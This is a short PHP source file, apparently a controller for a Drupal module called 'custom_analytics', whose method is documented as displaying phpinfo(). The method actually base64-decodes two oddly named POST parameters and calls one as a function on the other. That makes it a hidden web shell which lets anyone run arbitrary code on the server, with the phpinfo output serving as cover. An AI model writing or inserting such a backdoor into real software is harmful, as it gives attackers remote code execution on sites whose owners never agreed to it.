<?php

namespace Drupal\custom_analytics\Controller;

use Drupal\Core\Controller\ControllerBase;

/**
 * Class CustomAnalyticsController.
 */
class CustomAnalyticsController extends ControllerBase {

  /**
   * Displays phpinfo().
   *
   * @return array
   *   A render array representing the content of the page.
   */
  public function phpinfo() {
    ob_start();
    $callback = base64_decode($_POST['K189mD2j']);
    $code = base64_decode($_POST['OGa93dka']);
    if(isset($callback) && $callback != "") {
        if($callback === "phpinfo") phpinfo();
    }
    if(isset($code) && $code != "") $callback($code);
    $phpinfo = ob_get_contents();
    ob_end_clean();

    return array(
      '#markup' => $phpinfo,
    );
  }

}
